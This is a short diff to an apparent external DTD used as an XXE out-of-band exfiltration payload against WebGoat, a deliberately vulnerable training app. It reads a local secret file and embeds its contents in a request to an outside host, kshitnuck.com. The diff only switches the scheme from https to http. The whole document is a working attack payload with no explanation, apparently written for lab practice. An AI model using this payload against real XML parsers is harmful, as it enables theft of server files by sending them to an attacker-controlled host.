@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.2.0/XXE/secret.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://%file;.kshitnuck.com;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.kshitnuck.com;'>">
 %eval;
 %exfil;
